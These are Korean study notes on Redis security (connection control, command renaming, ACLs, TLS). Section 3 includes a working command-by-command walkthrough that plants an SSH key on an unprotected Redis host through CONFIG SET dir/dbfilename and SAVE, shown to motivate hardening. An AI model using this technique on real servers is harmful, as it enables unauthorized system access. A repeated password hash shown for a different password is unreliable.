# 11장 보안(Security)

## 0. 개요: 왜 레디스에 보안이 필요한가

레디스는 관계형 데이터베이스(RDBMS)만큼의 보안 관리가 필요하다.

- **캐시로 사용할 때**: RDBMS의 데이터를 임시 저장하는 것이므로, 신뢰할 수 없는 사용자가 레디스에 접근할 수 있게 되면 사실상 원본 데이터베이스에 접근하는 것과 동일한 효력을 가진다.
- **메시징 시스템으로 사용할 때**: pub/sub 혹은 메시지 큐로서 서비스 데이터의 **중간 전달자** 역할을 하므로, 데이터가 더욱 안전하게 관리돼야 한다.

### 버전별 보안 기능 흐름 (맥락)

| 기능 | 도입 시점 | 핵심 |
|------|-----------|------|
| `requirepass` (단일 패스워드) | 이전 버전부터 | 인스턴스당 패스워드 1개 |
| ACL (유저 개념) | **버전 6** | 유저별 패스워드·권한·키·채널 제어 |
| SSL/TLS 지원 | **버전 6** | 전송 구간 암호화 |
| 키 읽기/쓰기 분리(`%R`/`%W`), 셀렉터(selector) | **버전 7** | 더 세밀한 ACL |
| 커맨드 실행 환경 제어(`enable-*`) | **버전 7** | DEBUG/MODULE/protected-config 차단 |

---

## 1. 커넥션 제어

### 1.1 bind

**결론**: `bind`는 서버가 가진 여러 IP(네트워크 인터페이스) 중 **어떤 IP로 들어오는 연결을 받아들일지** 지정하는 설정이다.

- 레디스 인스턴스가 실행 중인 서버는 여러 개의 네트워크 인터페이스를 가질 수 있다 = 여러 개의 IP를 가질 수 있다.
- 예: 서버가 `eth0~eth3` + `lo`(localhost)까지 총 5개의 인터페이스를 가질 때, `eth1`과 `localhost`로 들어오는 연결만 허용하려면 해당 인터페이스의 IP만 지정한다.

```conf
bind 10.0.0.2 127.0.0.1
```

위 설정에서 `eth0(10.0.0.1)`로 접근하면 연결되지 않고, `10.0.0.2`와 로컬 `127.0.0.1`로 접근할 때에만 정상 연결된다.

**기본값과 동작 방식**
- `bind`의 기본값은 `127.0.0.1`(루프백/로컬 IP)이다. 기본값을 그대로 두면 **동일 서버 내에서의 연결만** 허용한다.
- 서버 외부에서 직접 접근해야 하면, 서버를 바라보는 다른 유효한 IP로 변경해야 한다.
- `bind` 값을 **주석 처리**하거나 `0.0.0.0` 또는 `*`로 설정하면, 서버가 가진 **모든 IP로 들어오는 연결을 허용**한다.

> **권장**: 레디스 인스턴스가 외부 인터넷에 노출되고 운영 목적으로 사용된다면, `bind`를 특정 IP로 설정해 의도하지 않은 연결을 방지하는 것이 안전하다.

### 1.2 패스워드 — `requirepass`

패스워드를 설정하는 방법은 두 가지다.
1. **노드에 직접 패스워드 지정** (이전 방식, `requirepass`)
2. **ACL**(버전 6.0에서 추가) — 유저별 패스워드 설정 (권장)

버전 6부터는 ACL이 권장되지만, 기존 `requirepass` 방식도 여전히 사용할 수 있다.

```redis
127.0.0.1:6379> CONFIG SET requirepass password
OK
```

- 패스워드는 `redis.conf`에 지정한 뒤 실행할 수도 있고, 운영 중 `CONFIG SET`으로 변경할 수도 있다.
- 접속 시 `-a` 옵션으로 패스워드를 직접 지정할 수 있다.

```bash
$ redis-cli -a password
Warning: Using a password with '-a' or '-u' option on the command line interface may not be safe.
```

- 커맨드라인에 직접 패스워드를 입력하면 안전하지 않을 수 있다는 경고가 출력된다. `--no-auth-warning` 옵션으로 경고를 숨길 수 있다.
- `-a` 없이 접속하면 인증 전까지는 아무 커맨드도 사용할 수 없으며, `AUTH`로 인증해야 한다.

```redis
$ redis-cli
127.0.0.1:6379> PING
(error) NOAUTH Authentication required.

127.0.0.1:6379> AUTH password
OK

127.0.0.1:6379> PING
PONG
```

### 1.3 protected-mode

`protected-mode`는 직접 기능을 바꾸지는 않지만, **다른 설정값을 제어**하는 안전장치다. 운영 용도라면 설정하는 게 좋다.

- `protected-mode`가 `yes`일 때, 레디스 인스턴스에 **패스워드를 설정하지 않았다면** `127.0.0.1`(로컬)로 들어오는 연결만 허용한다.
- 이는 `bind` 설정으로 다른 네트워크 인터페이스를 통한 연결을 허용했더라도 마찬가지다.
- 패스워드 없이 외부에서 사용하고 싶다면 `protected-mode`를 `no`로 변경해야 한다.
- 기본값은 `yes`이므로, 처음 설치한 뒤 패스워드를 설정하지 않으면 **로컬에서 직접 연결하는 것만 가능**하다.

---

## 2. 커맨드 제어

### 2.1 커맨드 제어의 필요성

- `CONFIG GET`으로 설정값을 읽고, 대부분의 파라미터는 `CONFIG SET`으로 재설정할 수 있다.
- **장점**: 운영자가 커맨드라인으로 편리하게 인스턴스를 제어할 수 있다.
- **위험**: 레디스에 접근할 수 있는 **모든 클라이언트가 인스턴스를 제어**할 수 있다.
- 예: 허용되지 않은 유저가 `CONFIG SET dir <경로>`로 기본 디렉터리를 바꾼 뒤 `BGSAVE`로 데이터를 저장하면, 레디스의 모든 데이터를 원하는 경로에 저장할 수 있다.
  - 해킹 사례에서 실제로 악용됨

### 2.2 rename-command (커맨드 이름 변경)

- `rename-command`는 특정 커맨드를 다른 이름으로 바꾸거나 비활성화하는 설정이다. 커맨드를 커스터마이징하거나 보안을 강화하는 데 도움이 된다.
- **`redis.conf`에서만 변경할 수 있으며**, 실행 중에는 동적으로 바꿀 수 없다(`CONFIG GET`/`CONFIG SET`으로 확인·변경 불가).

**(1) 다른 이름으로 변경**
```conf
rename-command CONFIG CONFIG_NEW
```
설정 후 원래 이름은 동작하지 않고 새 이름으로만 동작한다.
```redis
127.0.0.1:6379> CONFIG GET maxmemory
(error) ERR unknown command 'CONFIG', with args beginning with: 'GET' 'maxmemory'
127.0.0.1:6379> CONFIG_NEW GET maxmemory
1) "maxmemory"
2) "963641344"
```
`redis.conf`에 접근할 수 없는 사용자는 변경된 이름을 알 수 없어 해당 커맨드를 사용할 수 없다.

**(2) 빈 문자열로 비활성화**
```conf
rename-command CONFIG ""
```
빈 문자열로 변경하면 해당 커맨드는 아예 사용할 수 없게 된다.

**센티널 사용 시 주의**
- 센티널은 마스터에 장애가 발생했다고 판단하면 직접 레디스로 `REPLICAOF`, `CONFIG` 등의 커맨드를 보내 인스턴스를 제어한다.
- `rename-command`로 커맨드 이름을 바꿨다면, 장애 상황에서 센티널이 보내는 커맨드를 레디스가 수행할 수 없어 **페일오버가 정상적으로 발생하지 않는다.**
  - 따라서 `redis.conf`에서 바꾼 커맨드는 `sentinel.conf`에서도 동일하게 바꿔야 한다.

```conf
# redis.conf
rename-command CONFIG "my_config"
rename-command SHUTDOWN "my_shutdown"
```
```conf
# sentinel.conf
sentinel rename-command mymaster CONFIG my_config
sentinel rename-command mymaster SHUTDOWN my_shutdown
```

### 2.3 커맨드 실행 환경 제어 (버전 7이상)

버전 7부터는 위험할 수 있는 커맨드의 **실행 환경**을 제어할 수 있다.

```conf
enable-protected-configs no
enable-debug-command no
enable-module-command no
```

| 설정 | 차단 대상 |
|------|-----------|
| `enable-protected-configs` | `dir`(기본 경로), `dbfilename`(백업 파일 경로) 등을 `CONFIG` 커맨드로 수정하는 것 |
| `enable-debug-command` | `DEBUG` 커맨드 |
| `enable-module-command` | `MODULE` 커맨드 수행 |

**값 3종**
- `no`: 모든 연결에 대해 명령어 수행 차단
- `yes`: 모든 연결에 대해 명령어 수행 허용
- `local`: 로컬 연결(`127.0.0.1`)에 대해서만 명령어 수행 허용

> `DEBUG`는 디버깅용으로 운영 환경에서 잘 쓰지 않고, `MODULE`은 검증되지 않은 모듈을 가져올 수 있어 위험하다. 이런 커맨드는 `local` 또는 `no`로 설정하는 것이 좋다.

---

## 3. 레디스를 이용한 해킹 사례 (왜 보안이 중요한가)

**전제**: 서버 A(`203.0.113.1`)에서 레디스 실행, `port 6379`, `protected-mode no`, `requirepass ""`(패스워드 없음). 서버 B에서 A에 접근 가능한 상황.

**① telnet으로 통신 가능 확인**
```bash
[centos@serverB ~]$ telnet 203.0.113.1 6379
Trying 203.0.113.1...
Connected to 203.0.113.1.
Escape character is '^]'.
echo "no AUTH"
$7
no AUTH
quit
+OK
Connection closed by foreign host.
```
→ 네트워크 통신이 가능하고, `redis-cli`로 패스워드 없이 연결 가능하다.

**② 서버 B에서 SSH 키 생성**
```bash
[centos@serverB ~]$ ssh-keygen -t rsa
# id_rsa(개인키), id_rsa.pub(공개키) 생성
```

**③ 공개키를 앞뒤 공백을 넣어 텍스트 파일로 가공**
```bash
[centos@serverB ~]$ (echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n") > key.txt
```

**④ A의 레디스 데이터를 전부 지우고, 공개키 데이터를 삽입**
```bash
[centos@serverB ~]$ redis-cli -h 203.0.113.1 echo flushall
[centos@serverB ~]$ cat key.txt | redis-cli -h 203.0.113.1 -x set key
```

**⑤ A의 레디스가 데이터를 저장하는 경로와 파일명을 변경한 뒤 SAVE**
```redis
203.0.113.1:6379> CONFIG SET dir /home/centos/.ssh/
OK
203.0.113.1:6379> CONFIG GET dir
1) "dir"
2) "/home/centos/.ssh"
203.0.113.1:6379> CONFIG SET dbfilename authorized_keys
OK
203.0.113.1:6379> SAVE
OK
```
-> `dir`와 `dbfilename`을 바꾼 뒤 `SAVE`하면 `/home/centos/.ssh` 경로에 `authorized_keys`라는 파일명으로 RDB 파일이 저장된다. 즉, 공개키가 `authorized_keys`로 들어간다.

**⑥ 생성한 키로 A에 직접 SSH 접속**
```bash
[centos@serverB ~]$ ssh -i id_rsa centos@203.0.113.1
[centos@serverA ~]$
```
→ 레디스를 우회 경로로 사용해 SSH 키를 심고, **서버 자체에 직접 접근**하게 된다.

> **권장 대응**
> - `protected-mode yes` + **패스워드 설정**
> - 패스워드를 쓰지 않는다면 `enable-protected-configs`를 `local` 또는 `no`로 설정해 외부에서 `dir`/`dbfilename` 같은 중요 설정을 바꾸지 못하게 한다.

---

## 4. ACL (Access Control List)

### 4.1 개요와 등장 배경

- 버전 6에서 도입. **유저** 개념을 도입해 유저별로 **실행 가능한 커맨드**와 **접근 가능한 키**를 제한한다.
- 버전 6 이전에는 유저 개념이 없어, 패스워드만 알면 모든 커맨드 실행·전체 키 접근·인스턴스 상태 변경이 가능했다. 즉 클라이언트의 권한을 제어할 수 없었다.
  - 허용되지 않은 클라이언트가 `FLUSHALL`로 전체 삭제, `REPLICAOF`로 복제 설정 변경, `SHUTDOWN`으로 인스턴스 종료가 가능했다.
- `rename-command`로 위험 커맨드를 가릴 수는 있었지만 일시적이고, 변경된 이름이 노출되면 우회가 가능해 완벽한 권한 제어는 아니었다.

### 4.2 ACL SETUSER 구문 구조

```redis
ACL SETUSER garimoo on >password ~cached:* &* +@all -@dangerous
```

| 구문 | 의미 |
|------|------|
| `garimoo` | 유저 이름 |
| `on` | 활성 상태 |
| `>password` | 비밀번호 |
| `~cached:*` | 접근 가능한 키 (`cached:` 프리픽스) |
| `&*` | 접근 가능한 pub/sub 채널 (전체) |
| `+@all -@dangerous` | 실행 가능한 커맨드 (위험 카테고리 제외 전체) |

→ `garimoo`는 활성 상태이고, 패스워드는 `password`, `cached:` 프리픽스 키에만 접근 가능, 모든 채널에 pub/sub 가능, 위험 커맨드를 제외한 전체 커맨드를 사용할 수 있다.

> ACL 규칙은 항상 **왼쪽에서 오른쪽으로** 적용되므로 권한을 적용하는 **순서**가 중요하다.

### 4.3 유저의 생성과 삭제

`ACL SETUSER`(생성/수정), `ACL DELUSER`(삭제), `ACL GETUSER`(조회)를 사용한다.

```redis
127.0.0.1:10379> ACL GETUSER garimoo
 1) "flags"
 2) 1) "on"
 3) "passwords"
 4) 1) "5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8"
 5) "commands"
 6) "+@all -@dangerous"
 7) "keys"
 8) "~cached:*"
 9) "channels"
10) "&*"
11) "selectors"
12) (empty array)
```

키 접근 권한을 **추가**하려면 `ACL SETUSER`를 한 번 더 수행한다(기존 권한에 누적됨).
```redis
> ACL SETUSER garimoo ~id:*
OK
> ACL GETUSER garimoo
...
 8) "~cached:* ~id:*"
...
```

삭제:
```redis
> ACL DELUSER garimoo
(integer) 1
```

### 4.4 기본 유저(default)

패스워드와 유저를 따로 만들지 않았다면 기본 유저가 존재한다. `ACL LIST`로 모든 유저를 확인할 수 있다.
```redis
> ACL LIST
1) "user default on nopass ~* &* +@all"
```

| 항목 | 기본 유저 값 |
|------|--------------|
| 유저 이름 | `default` |
| 유저 상태 | `on` (활성) |
| 패스워드 | `nopass` (없음) |
| 접근 가능 키 | `~*` (전체) |
| 접근 가능 채널 | `&*` (전체) |
| 접근 가능 커맨드 | `+@all` (전체) |

### 4.5 유저 상태 제어 (on/off)

- `on`은 해당 유저로의 접근을 허용한다는 의미다.
- `on` 구문 없이 유저를 생성하면 기본적으로 **`off` 상태**로 만들어진다. 따라서 생성 시 `on`을 명시하거나, 이후 `ACL SETUSER <username> on`으로 상태를 바꿔야 한다.

```redis
> ACL SETUSER user1
OK
> ACL GETUSER user1
1) "flags"
2) 1) "off"

> ACL SETUSER user1 on
OK
> ACL GETUSER user1
1) "flags"
2) 1) "on"
```

> 활성 상태였던 유저를 `off`로 바꾸면 더 이상 그 유저로 접근할 수 없지만, **이미 접속해 있는 연결은 그대로 유지**된다.

### 4.6 패스워드 제어 (ACL)

- `>패스워드` 키워드로 패스워드를 지정한다. **1개 이상** 지정할 수 있고, `<패스워드`로 지정한 패스워드를 삭제한다.
- 패스워드를 지정하지 않으면 유저에 접근할 수 없으나, **`nopass`** 권한을 부여하면 패스워드 없이 접근할 수 있다. `nopass`를 부여하면 기존에 설정된 모든 패스워드도 삭제된다.
- **`resetpass`** 권한을 부여하면 저장된 모든 패스워드가 삭제되고 `nopass` 상태도 없어진다. → 다른 패스워드나 `nopass`를 부여하기 전까지 그 유저에 접근할 수 없게 된다.

```redis
> ACL LIST
1) "user user1 on nopass resetchannels -@all"

> ACL SETUSER user1 resetpass
OK

# 이후
127.0.0.1:10379> ACL LIST
1) "user user1 on resetchannels -@all"
```

### 4.7 패스워드 저장 방식

- **`requirepass`(ACL 미사용)**: 암호화되지 않은 채로 저장된다. → 설정 파일에 접근하거나 `CONFIG GET requirepass`로 **누구나 패스워드를 확인**할 수 있다.
```redis
> CONFIG GET requirepass
1) "requirepass"
2) "mypassword"
```
- **ACL**: 내부적으로 **SHA256**으로 암호화 저장된다. → 유저 정보를 조회해도 패스워드 원문을 알 수 없다.
```redis
> ACL SETUSER user:100 on >mypassword
OK
> ACL GETUSER user:100
...
4) 1) "5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8"
```
- 복잡한 패스워드 사용이 권장된다. `ACL GENPASS`로 난수를 생성할 수 있다.
```redis
> ACL GENPASS
"05c8f9f6218ebebc97458272d5a79f0f01718190459e2c89eb832433405f1008"
```

### 4.8 커맨드 권한 제어

- 일부 커맨드는 그룹화되어 **카테고리**로 정리돼 있어, 운영자가 일일이 직접 제어할 필요가 없다. 개별 커맨드, 나아가 특정 **서브 커맨드**도 제어 가능하다.
- `+@all`(=`allcommands`): 모든 커맨드 수행 권한 부여
- `-@all`(=`nocommands`): 아무 커맨드도 수행 불가
- 커맨드 권한에 대한 언급 없이 유저를 만들면 **`-@all` 권한**의 유저가 생성된다.
- 카테고리 추가/제외: `+@<category>` / `-@<category>`
- 개별 커맨드 추가/제외: `@` 없이 `+<command>` / `-<command>`

```redis
> ACL SETUSER user1 +@all -@admin +bgsave +slowlog|get
```
→ ACL 룰은 왼쪽부터 순서대로 적용된다. 모든 커맨드 권한을 부여한 뒤, `admin` 카테고리를 제외하고, 다시 `bgsave`와 `slowlog`의 서브커맨드 `get`만 추가로 부여한다.

카테고리 목록 확인:
```redis
> ACL CAT
 1) "keyspace"   2) "read"        3) "write"      4) "set"
 5) "sortedset"  6) "list"        7) "hash"       8) "string"
 9) "bitmap"    10) "hyperloglog" 11) "geo"      12) "stream"
13) "pubsub"    14) "admin"      15) "fast"      16) "slow"
17) "blocking"  18) "dangerous"  19) "connection" 20) "transaction"
21) "scripting"
```
각 카테고리의 상세 커맨드는 `ACL CAT <카테고리명>`으로 확인한다.

### 4.9 주요 카테고리

#### dangerous
아무나 사용하면 위험한 커맨드가 포함된다. 구성을 바꾸거나, 오래 수행되어 장애를 유발할 수 있거나, 운영자가 아니면 안 써도 되는 커맨드들이다.

- **구성 변경 커맨드**: `replconf`, `replicaof`, `migrate`, `failover`
- **장애 유발 커맨드**: `sort`, `flushdb`, `flushall`, `keys`
- **운영 커맨드**: `shutdown`, `monitor`, `acl|log`·`acl|deluser`·`acl|list`·`acl|setuser`, `bgsave`·`bgrewriteaof`, `info`, `config|get`·`config|set`·`config|rewrite`·`config|resetstat`, `debug`, `cluster|addslots`·`cluster|forget`·`cluster|failover`, `latency|graph`·`latency|doctor`·`latency|reset`·`latency|history`, `client|list`·`client|kill`·`client|pause`, `module|loadex`·`module|list`·`module|unload`

이유:
- `replicaof` 류는 마스터 정보를 바꿔 의도하지 않은 구성으로 변경될 수 있다.
- `sort`/`keys`는 메모리의 모든 키에 접근해, 데이터가 많으면 오래 수행되며 다른 커맨드를 막을 수 있다.
- `client list`/`info`/`config get`은 장애를 유발하진 않지만, 운영자가 아니면 굳이 알 필요 없는 정보를 노출할 수 있다.

> 운영팀이 따로 있고 개발자에게 레디스를 제공한다면, `dangerous` 카테고리만 막아도 의도치 않은 장애를 크게 줄일 수 있다.

#### admin
`dangerous`에서 **장애 유발 커맨드를 제외**한 커맨드들. `keys`/`sort`/`flushall` 같은 커맨드는 구성 변경/운영용은 아니지만 잘 모르고 쓰면 장애를 유발할 수 있어, 개발 용도 인스턴스를 제공할 때는 `admin` 카테고리만 제외한 권한을 줄 수 있다.

#### fast
`O(1)`로 수행되는 커맨드. `get`, `spop`, `hset` 등.

#### slow
`fast`에 속하지 않은 커맨드. `scan`, `set`, `setbit`, `sunion` 등.

#### keyspace
키와 관련된 커맨드. `scan`, `keys`, `rename`, `type`, `expire`, `exists` 등(키 이름 변경, 종류 파악, TTL 확인, 존재 확인).

#### read
데이터를 읽어오는 커맨드(자료 구조별 읽기 전용). `get`, `hget`, `xrange` 등.

#### write
메모리에 데이터를 쓰는 커맨드. `set`, `lset`, `setbit`, `hmset` 등. 키 만료 시간 등 메타데이터를 변경하는 `expire`, `pexpire`도 포함.

### 4.10 키 접근 제어

- 레디스는 프리픽스로 키를 생성하는 것이 일반적이므로, 특정 프리픽스 키에만 접근하도록 제어할 수 있다.
- `~*`(=`allkeys`): 모든 키 접근. `~<pattern>`으로 접근 가능 키 정의.
  - 예: `~mail:*` → `mail:`로 시작하는 모든 키 접근.
- **버전 7부터** 키에 대한 읽기/쓰기 권한을 나눠 부여 가능:
  - `%R~<pattern>`: 읽기 권한
  - `%W~<pattern>`: 쓰기 권한
  - `%RW~<pattern>`: 읽기+쓰기 (= `~<pattern>`과 동일)

```redis
# loguser: log: 전체 권한, mail:/sms:는 읽기만
ACL SETUSER loguser ~log:* %R~mail:* %R~sms:*
```
이 권한이면 `loguser`는 다음을 수행할 수 있다.
```redis
> COPY mail:1 log:mail:1
(integer) 1
```
- **`resetkeys`**: 유저의 키 접근 권한을 모두 초기화한다.

### 4.11 셀렉터 (selector, 버전 7이상)

셀렉터는 "특정 키 패턴에 대해 특정 커맨드만 허용"하는 식의 더 유연한 ACL 규칙을 위해 도입됐다. 괄호 `( )` 안에 정의한다.

예: 위 `loguser`는 `%R~mail:*` 권한이 있으므로 `mail:` 키의 메타데이터(TTL 등)도 조회할 수 있다.
```redis
> TTL mail:1
(integer) 95
```
그런데 `mail:` 프리픽스 키에 대해 **오직 `GET`만** 허용하고 싶다면 셀렉터를 쓴다.
```redis
> ACL SETUSER loguser resetkeys ~log:* (+GET ~mail:*)
```
→ `loguser`에 정의된 모든 키를 리셋(`resetkeys`)하고, `log:`에 모든 접근 권한을 준 뒤, `mail:`에는 **`get`만** 가능하도록 설정한다.

결과적으로 `mail:` 키에 `GET` 외 다른 기능은 사용할 수 없다.
```redis
> TTL mail:1
(error) NOPERM this user has no permissions to access one of the keys used as arguments
```

### 4.12 pub/sub 채널 접근 제어

- `&<pattern>`으로 pub/sub 채널 접근 권한을 제어한다.
- `allchannels`(=`&*`): 전체 채널 접근 권한 부여.
- `resetchannels`: 어떤 채널에도 발행/구독 불가.
- 유저를 생성하면 기본으로 **`resetchannels`** 권한을 부여받는다.

### 4.13 유저 초기화 (reset)

- `reset` 커맨드로 유저의 모든 권한을 회수하고 기본 상태로 변경한다.
- `reset`을 사용하면 `resetpass`, `resetkeys`, `resetchannels`, `off`, `-@all` 상태로 변경되어, **`ACL SETUSER`를 막 한 직후와 동일**해진다.

### 4.14 ACL 규칙 파일로 관리하기

- ACL 규칙은 파일로 관리할 수 있다. 기본적으로 일반 설정 파일인 `redis.conf`에 저장되며, ACL 파일을 따로 관리해 유저 정보만 저장할 수도 있다.
- 별도 ACL 파일로 관리하려면 `redis.conf`에 추가:
```conf
aclfile /etc/redis/users.acl
```
- `redis.conf`에 저장되든 ACL 파일에 저장되든 형태는 동일하며, 저장 위치만 다르다.

**저장 커맨드 차이 (운영 시 주의)**
- **ACL 파일을 쓰지 않을 때**: `CONFIG REWRITE`로 모든 설정값 + ACL 룰을 한 번에 `redis.conf`에 저장할 수 있다.
- **ACL 파일을 따로 관리할 때**: `ACL LOAD`/`ACL SAVE`로 유저 데이터를 로드/저장할 수 있어 운영에 더 유용하다.
- ACL 파일을 따로 사용한다고 지정했을 때 `CONFIG REWRITE`를 사용하면 **ACL 정보는 저장되지 않는다**.

---

## 5. SSL/TLS

레디스는 **버전 6부터** SSL/TLS 프로토콜을 이용한 보안 연결을 지원한다.

### 5.1 SSL/TLS란?

- **SSL**(Secure Sockets Layer): 암호화를 위한 인터넷 기반 보안 프로토콜, 1995년 처음 개발.
- **TLS**(Transport Layer Security): 현재 널리 쓰이는 보안 프로토콜, SSL에서 발전.
- SSL은 1996년 이후 업데이트되지 않았고, 현재 대부분 더 안전한 TLS를 사용한다. 다만 SSL이라는 용어가 여전히 쓰여 두 용어가 혼용되며, 통상 **SSL/TLS**로 표기한다.
- TLS 1.0/1.1은 안전하지 않다고 여겨지며 **TLS 1.2 이상** 사용이 권장된다.

**역할**
- 데이터 전송 과정에서 정보를 암호화 → 중간에서 노출·조작되는 것을 방지한다.
- 클라이언트-서버 간 안전한 **핸드셰이크**를 거치며, 이 과정에서 **상호 인증**으로 양쪽이 신뢰할 수 있는지 확인한다.
- **인증서**는 통신의 무결성·기밀성을 확보하는 핵심이다.
  - **무결성**: 데이터가 전송 과정에서 왜곡되지 않았음을 보증.
  - **기밀성**: 제3자가 데이터를 열람할 수 없도록 보호.
- 레디스는 네트워크로 데이터를 빠르게 주고받으므로, 민감 정보가 평문으로 전송되면 공격자가 트래픽을 감청해 열람·조작할 위험이 있다. 클라우드/원격 환경에서 특히 중요하다.

### 5.2 레디스에서 SSL/TLS 사용하기

기본적으로 SSL/TLS는 **비활성화**돼 있다. 사용하려면 **빌드할 때부터** 활성화해야 한다.
```bash
make BUILD_TLS=yes
```
- 일반적으로 레디스 인스턴스와 클라이언트 간 **동일한 인증서**를 사용한다.
  - `key`, `cert`, `ca-cert` 파일을 클라이언트에도 동일하게 복사해야 한다.

`redis.conf`에 `tls-port`를 추가하면 SSL/TLS 연결을 사용한다는 의미이며, 인증 파일 정의가 필요하다.
```conf
tls-port <포트 번호>
tls-cert-file /path/to/redis.crt
tls-key-file /path/to/redis.key
tls-ca-cert-file /path/to/ca.crt
```
- `port`와 `tls-port`를 모두 지정하면 두 설정을 다 받아들인다.
  - 예: `port 6379`, `tls-port 16379`
  - 6379는 일반 통신, 16379는 인증서 기반 TLS 통신
- 인증서 없으면 접근하지 못하게 막고 싶다면 **`port 0`**을 명시해 기본 포트를 비활성화한다.

**redis-cli로 TLS 인스턴스 접속** (인증서는 `redis.conf`와 동일해야 함)
```bash
./src/redis-cli --tls \
    --cert /path/to/redis.crt \
    --key /path/to/redis.key \
    --cacert /path/to/ca.crt
```

**파이썬 클라이언트 접속 예**
```python
import os
import redis

ssl_certfile="/path/to/redis.crt"
ssl_keyfile="/path/to/redis.key"
ssl_ca_certs="/path/to/ca.crt"

ssl_cert_conn = redis.Redis(
    host="localhost",
    port=16379,
    ssl=True,
    ssl_certfile=ssl_certfile,
    ssl_keyfile=ssl_keyfile,
    ssl_cert_reqs="required",
    ssl_ca_certs=ssl_ca_certs,
)

ssl_cert_conn.ping()
```

### 5.3 SSL/TLS를 사용한 HA 구성

#### 복제 구성
SSL/TLS를 쓰는 마스터와 TLS로 복제하려면, **복제본도 마스터와 동일하게** 다음 설정을 추가한다.
```conf
tls-port <포트 번호>
tls-replication yes
tls-cert-file /path/to/redis.crt
tls-key-file /path/to/redis.key
tls-ca-cert-file /path/to/ca.crt
```
- **`tls-replication` 기본값은 `no`** 다. 이는 복제본에서 마스터로의 커넥션이 SSL/TLS가 아닌 일반 프로토콜로 연결됨을 의미한다.
- `no`로 두면 정상적으로 복제 연결을 구성할 수 없으며, 마스터는 다음 로그를 남긴다.
```text
Error accepting a client connection: error:140760FC:SSL routines:SSL23_GET_CLIENT_HELLO:unknown protocol
```
- 복제본 -> 마스터 연결도 SSL/TLS로 하려면 `tls-replication yes`로 설정해야 한다.

#### 센티널 구성
센티널도 SSL/TLS로 레디스에 접속할 수 있다. `sentinel.conf`에 추가한다.
```conf
tls-port <포트 번호>
tls-replication yes
tls-cert-file /path/to/redis.crt
tls-key-file /path/to/redis.key
tls-ca-cert-file /path/to/ca.crt
```

#### 클러스터 구성
클러스터에서 SSL/TLS를 쓰려면 `tls-cluster yes`를 추가한다.
```conf
tls-port <포트 번호>
tls-replication yes
tls-cluster yes
tls-cert-file /path/to/redis.crt
tls-key-file /path/to/redis.key
tls-ca-cert-file /path/to/ca.crt
```
모든 클러스터 노드 간의 연결과 **클러스터 버스**의 통신이 SSL/TLS로 보호된다.
